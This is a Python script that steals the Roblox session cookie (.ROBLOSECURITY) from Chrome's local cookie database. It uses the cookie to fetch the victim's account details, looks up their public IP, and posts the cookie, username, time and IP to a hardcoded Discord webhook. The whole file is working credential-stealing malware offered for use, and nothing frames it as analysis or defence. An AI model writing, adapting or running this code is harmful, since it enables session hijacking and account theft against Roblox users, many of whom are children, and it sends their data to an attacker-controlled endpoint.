import os
import sqlite3
import shutil
import requests
import json
from datetime import datetime

# Your Discord webhook
WEBHOOK_URL = "https://discord.com/api/webhooks/1487469235851628735/YCPZPC75djdPCOEei-4bVjalfvw2bPyDHHiXXSd9VJfIPaoczf-goo2Ce_ToLERumIRo"


def get_chrome_cookies():
    cookie_path = os.path.join(
        os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default\Network\Cookies')

    if not os.path.exists(cookie_path):
        return "No Chrome cookies found"

    temp_path = "temp_cookies.db"
    shutil.copy2(cookie_path, temp_path)

    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()

    cursor.execute(
        "SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%'")
    cookies = cursor.fetchall()

    conn.close()
    os.remove(temp_path)

    for name, value in cookies:
        if name == ".ROBLOSECURITY":
            return value.decode('utf-8', errors='ignore')

    return "No .ROBLOSECURITY found"


def get_roblox_info(cookie):
    headers = {"Cookie": f".ROBLOSECURITY={cookie}",
               "User-Agent": "Mozilla/5.0"}
    try:
        resp = requests.get(
            "https://users.roblox.com/v1/users/authenticated", headers=headers)
        if resp.status_code == 200:
            return resp.json()
    except:
        pass
    return {"username": "Unknown"}


def send_to_webhook(cookie, info):
    embed = {
        "title": "Roblox Cookie Logged",
        "description": f"**Cookie:** `{cookie}`",
        "color": 0xff0000,
        "fields": [
            {"name": "Username", "value": info.get("username", "N/A")},
            {"name": "Time", "value": str(datetime.now())},
            {"name": "IP", "value": requests.get("https://api.ipify.org").text}
        ]
    }

    data = {"embeds": [embed]}
    requests.post(WEBHOOK_URL, json=data)


if __name__ == "__main__":
    cookie = get_chrome_cookies()
    if "No" not in cookie:
        info = get_roblox_info(cookie)
        send_to_webhook(cookie, info)
        print("Cookie sent!")
    else:
        print("Nothing found.")
